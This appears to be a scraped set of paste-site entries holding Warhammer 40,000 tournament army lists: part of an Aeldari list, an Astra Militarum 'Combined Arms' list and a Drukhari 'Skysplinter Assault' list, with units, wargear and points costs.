Dark Reapers (90 points)
• 1x Aspect Shrine Token
• 1x Dark Reaper Exarch
• 1x Close combat weapon
1x Missile launcher
• 4x Dark Reaper
• 4x Close combat weapon
4x Reaper launcher

Fire Dragons (110 points)
• 1x Aspect Shrine Token
• 1x Fire Dragon Exarch
• 1x Close combat weapon
1x Firepike
• 4x Fire Dragon
• 4x Close combat weapon
4x Dragon fusion gun

Fire Dragons (110 points)
• 1x Aspect Shrine Token
• 1x Fire Dragon Exarch
• 1x Close combat weapon
1x Firepike
• 4x Fire Dragon
• 4x Close combat weapon
4x Dragon fusion gun

Fire Dragons (110 points)
• 1x Aspect Shrine Token
• 1x Fire Dragon Exarch
• 1x Close combat weapon
1x Firepike
• 4x Fire Dragon
• 4x Close combat weapon
4x Dragon fusion gun

Howling Banshees (90 points)
• 1x Aspect Shrine Token
• 1x Howling Banshee Exarch
• 1x Executioner
1x Shuriken pistol
• 4x Howling Banshee
• 4x Banshee blade
4x Shuriken pistol

Howling Banshees (90 points)
• 1x Aspect Shrine Token
• 1x Howling Banshee Exarch
• 1x Executioner
1x Shuriken pistol
• 4x Howling Banshee
• 4x Banshee blade
4x Shuriken pistol

Howling Banshees (90 points)
• 1x Aspect Shrine Token
• 1x Howling Banshee Exarch
• 1x Executioner
1x Shuriken pistol
• 4x Howling Banshee
• 4x Banshee blade
4x Shuriken pistol

Shroud Runners (80 points)
• 3x Shroud Runner
• 3x Close combat weapon
3x Long rifle
3x Scatter laser
3x Shuriken pistol

Striking Scorpions (85 points)
• 1x Striking Scorpion Exarch
• 1x Biting blade
1x Shuriken pistol
• 4x Striking Scorpion
• 4x Scorpion chainsword
4x Shuriken pistol

Striking Scorpions (85 points)
• 1x Striking Scorpion Exarch
• 1x Biting blade
1x Shuriken pistol
• 4x Striking Scorpion
• 4x Scorpion chainsword
4x Shuriken pistol

Warp Spiders (95 points)
• 1x Aspect Shrine Token
• 1x Warp Spider Exarch
• 1x Close combat weapon
1x Death weavers
1x Spinneret rifle
• 4x Warp Spider
• 4x Close combat weapon
4x Death spinner

Warp Spiders (95 points)
• 1x Aspect Shrine Token
• 1x Warp Spider Exarch
• 1x Close combat weapon
1x Powerblade array
• 4x Warp Spider
• 4x Close combat weapon
4x Death spinner

Warp Spiders (95 points)
• 1x Aspect Shrine Token
• 1x Warp Spider Exarch
• 1x Close combat weapon
1x Death weavers
1x Spinneret rifle
• 4x Warp Spider
• 4x Close combat weapon
4x Death spinner"
D2t5fbKF,Round 2 Nick,AnthTableTop,PHP,Sunday 6th of April 2025 06:54:09 PM CDT,"Everything's Computer (2000 points)

Astra Militarum
Strike Force (2000 points)
Combined Arms


CHARACTERS

Cadian Command Squad (65 points)
• 1x Cadian Commander
• 1x Plasma pistol
1x Power fist
• 1x Cadian Veteran Guardsman
• 1x Close combat weapon
1x Plasma gun
1x Plasma pistol
• 1x Cadian Veteran Guardsman
• 1x Close combat weapon
1x Lasgun
1x Master Vox
• 1x Cadian Veteran Guardsman
• 1x Close combat weapon
1x Lasgun
1x Medi-pack
• 1x Cadian Veteran Guardsman
• 1x Close combat weapon
1x Plasma gun

Rogal Dorn Commander (265 points)
• 1x Armoured tracks
1x Coaxial autocannon
3x Heavy stubber
2x Multi-melta
1x Oppressor cannon
1x Pulveriser cannon

Ursula Creed (65 points)
• Warlord
• 1x Duty and Vengeance
1x Power weapon


BATTLELINE

Cadian Shock Troops (65 points)
• 1x Shock Trooper Sergeant
• 1x Close combat weapon
1x Sergeant’s autogun
• 9x Shock Trooper
• 9x Close combat weapon
7x Lasgun
1x Plasma gun
1x Meltagun
1x Vox-caster


DEDICATED TRANSPORTS

Taurox (65 points)
• 1x Armoured tracks
1x Storm bolter
1x Twin autocannon


OTHER DATASHEETS

Attilan Rough Riders (120 points)
• 1x Rough Rider Sergeant
• 1x Hunting lance
1x Lasgun
1x Laspistol
1x Power sabre
1x Steed’s hooves
• 9x Rough Rider
• 9x Hunting lance
9x Lasgun
9x Laspistol
9x Steed’s hooves

Attilan Rough Riders (60 points)
• 1x Rough Rider Sergeant
• 1x Hunting lance
1x Lasgun
1x Laspistol
1x Power sabre
1x Steed’s hooves
• 4x Rough Rider
• 4x Hunting lance
4x Lasgun
4x Laspistol
4x Steed’s hooves

Hellhound (125 points)
• 1x Armoured tracks
1x Heavy bolter
1x Hunter-killer missile
1x Inferno cannon

Kasrkin (110 points)
• 1x Kasrkin Sergeant
• 1x Plasma pistol
1x Power weapon
• 9x Kasrkin
• 9x Close combat weapon
3x Hot-shot lasgun
1x Hot-shot laspistol
1x Hot-shot marksman rifle
1x Melta Mine
2x Meltagun
2x Plasma gun
1x Vox-caster

Kasrkin (110 points)
• 1x Kasrkin Sergeant
• 1x Plasma pistol
1x Power weapon
• 9x Kasrkin
• 9x Close combat weapon
3x Hot-shot lasgun
1x Hot-shot laspistol
1x Hot-shot marksman rifle
1x Melta Mine
2x Meltagun
2x Plasma gun
1x Vox-caster

Kasrkin (110 points)
• 1x Kasrkin Sergeant
• 1x Plasma pistol
1x Power weapon
• 9x Kasrkin
• 9x Close combat weapon
3x Hot-shot lasgun
1x Hot-shot laspistol
1x Hot-shot marksman rifle
1x Melta Mine
2x Meltagun
2x Plasma gun
1x Vox-caster

Krieg Heavy Weapons Squad (75 points)
• 3x Heavy Weapons Gunner
• 3x Close combat weapon
3x Krieg heavy flamer
3x Laspistol
• 1x Fire Coordinator
• 1x Close combat weapon
1x Laspistol

Leman Russ Battle Tank (175 points)
• 1x Armoured tracks
1x Heavy stubber
1x Hunter-killer missile
1x Lascannon
1x Leman Russ battle cannon
2x Multi-melta

Leman Russ Battle Tank (175 points)
• 1x Armoured tracks
1x Heavy stubber
1x Hunter-killer missile
1x Lascannon
1x Leman Russ battle cannon
2x Multi-melta

Leman Russ Exterminator (180 points)
• 1x Armoured tracks
1x Exterminator autocannon
1x Heavy stubber
1x Hunter-killer missile
1x Lascannon
2x Multi-melta

Ogryn Squad (60 points)
• 1x Ogryn Bone ’ead
• 1x Ripper gun
• 2x Ogryn
• 2x Ripper gun

Ogryn Squad (60 points)
• 1x Ogryn Bone ’ead
• 1x Ripper gun
• 2x Ogryn
• 2x Ripper gun

Ratlings (60 points)
• 5x Ratling Sniper
• 5x Close combat weapon
5x Sniper rifle

Scout Sentinels (55 points)
• 1x Close combat weapon
1x Hunter-killer missile
1x Lascannon
1x Sentinel chainsaw"
DDxYqEuU,Skari,AnthTableTop,PHP,Sunday 6th of April 2025 06:53:07 PM CDT,"LAYER NAME: Ridvan ‘Skari’ Martinez
TEAM NAME: The Eh Team
FACTIONS USED: Drukhari
TOTAL ARMY POINTS: 2000pts
WARLORD: Archon
ENHANCEMENT: Enhancements: Nightmare Shroud (character 1,archon)
DETACHMENT RULE: Skysplinter Assault - Rain of Cruelty
+++++++++++++++++++++++++++++++++++++++++++++++

List Title: 600pts in bombers for 470 pts today only!

CHARACTERS

Archon (105 Points)
• Warlord
• 1x Blast pistol
• 1x Huskblade
• Enhancements: Nightmare Shroud

Beastmaster (120 Points)
• 1x Beastmaster
◦ 1x Agoniser
◦ 1x Splinter pods
• 1x Clawed Fiend
◦ 1x Clawed Fiend fists
• 2x Khymerae
◦ 2x Khymerae talons
• 3x Razorwing Flock
◦ 3x Razorwing feathers

Lelith Hesperax (95 Points)
• 1x Lelith’s blades

Urien Rakarth (80 Points)
• 1x Casket of Flensing
• 1x Haemonculus tools and scissorhands

BATTLELINE

Kabalite Warriors (100 Points)
• 1x Sybarite
◦ 1x Blast pistol
◦ 1x Phantasm grenade launcher
◦ 1x Sybarite weapon
• 9x Kabalite Warrior
◦ 1x Blaster
◦ 9x Close combat weapon
◦ 1x Dark lance
◦ 1x Shredder
◦ 1x Splinter cannon
◦ 5x Splinter rifle

Wracks (55 Points)
• 1x Acothyst
◦ 1x Wrack blades
• 4x Wrack
◦ 1x Hexrifle
◦ 1x Liquifier gun
◦ 1x Ossefactor
◦ 1x Stinger pistol
◦ 4x Wrack blades

Wyches (80 Points)
• 1x Hekatrix
◦ 1x Blast pistol
◦ 1x Hekatarii blade
◦ 1x Phantasm grenade launcher
• 9x Wych
◦ 9x Hekatarii blade
◦ 9x Splinter pistol

DEDICATED TRANSPORTS

Raider (80 Points)
• 1x Bladevanes
• 1x Dark lance

Venom (70 Points)
• 1x Bladevanes
• 1x Splinter cannon
• 1x Splinter cannon

Venom (70 Points)
• 1x Bladevanes
• 1x Splinter cannon
• 1x Splinter cannon

OTHER DATASHEETS

Court of the Archon (95 Points)
• 1x Lhamaean
◦ 1x Shaimeshi blade
• 1x Medusae
◦ 1x Close combat weapon
◦ 1x Eyeburst
• 1x Sslyth
◦ 1x Shardcarbine
◦ 1x Splinter pistol
◦ 1x Sslyth battle-blade
• 1x Ur-ghul
◦ 1x Ur-ghul talons

Cronos (50 Points)
• 1x Spirit syphon
• 1x Spirit vortex
• 1x Spirit-leech tentacles

Cronos (50 Points)
• 1x Spirit syphon
• 1x Spirit vortex
• 1x Spirit-leech tentacles

Grotesques (80 Points)
• 3x Grotesque
◦ 3x Liquifier gun
◦ 3x Monstrous weapons

Mandrakes (70 Points)
• 1x Nightfiend
◦ 1x Baleblast
◦ 1x Glimmersteel blade
• 4x Mandrake
◦ 4x Baleblast
◦ 4x Glimmersteel blade

Mandrakes (70 Points)
• 1x Nightfiend
◦ 1x Baleblast
◦ 1x Glimmersteel blade
• 4x Mandrake
◦ 4x Baleblast
◦ 4x Glimmersteel blade

Scourges (130 Points)
• 1x Solarite
◦ 1x Close combat weapon
◦ 1x Shardcarbine
◦ 1x Solarite weapon
• 4x Scourge
◦ 4x Close combat weapon
◦ 4x Drukhari haywire blaster

Scourges (130 Points)
• 1x Solarite
◦ 1x Close combat weapon
◦ 1x Shardcarbine
◦ 1x Solarite weapon
• 4x Scourge
◦ 4x Close combat weapon
◦ 4x Dark lance

Voidraven Bomber (235 Points)
• 1x Bladed wings
• 2x Dark scythe
• 1x Voidraven missiles

Voidraven Bomber (235 Points)
• 1x Bladed wings
• 2x Dark scythe
• 1x Voidraven missiles"
